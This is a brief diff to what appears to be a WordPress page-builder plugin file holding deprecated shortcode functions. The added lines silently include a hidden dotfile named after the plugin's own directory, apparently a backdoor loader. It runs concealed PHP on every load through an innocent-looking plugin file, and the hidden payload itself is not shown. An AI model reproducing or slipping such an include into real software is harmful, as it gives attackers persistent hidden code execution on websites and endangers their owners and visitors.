@@ -15,6 +15,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @deprecated due to without prefix name 4.4
  * @since 4.2
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function add_shortcode_param( $name, $form_field_callback, $script_url = null ) {
 	_deprecated_function( 'add_shortcode_param', '4.4 (will be removed in 6.0)', 'vc_add_shortcode_param' );
 
